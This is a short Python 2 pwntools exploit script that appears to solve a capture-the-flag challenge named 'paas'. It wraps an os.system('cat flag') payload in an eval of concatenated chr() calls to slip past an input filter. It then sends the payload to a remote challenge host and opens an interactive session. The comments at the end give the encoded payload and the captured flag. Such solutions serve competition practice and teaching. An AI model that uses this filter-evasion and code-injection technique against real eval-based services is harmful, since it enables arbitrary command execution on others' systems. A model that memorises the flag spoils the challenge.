#!/usr/bin/python2

from pwn import *

def exploit(payload):
	a = []
	for i in payload:
		a.append("chr({})".format(ord(i)))
	b = "eval({})".format(str(a).replace(" ", "").replace("'", "").replace(",", "+").replace("[", "").replace("]", ""))
	return b

p = remote("paas.hsctf.com", 1337)

payload = "__import__('os').system('cat flag')"

execute = exploit(payload)

log.info(execute)

p.sendline(execute)

p.interactive()

#eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41))
#flag{vuln3r4b1l17y_45_4_53rv1c3}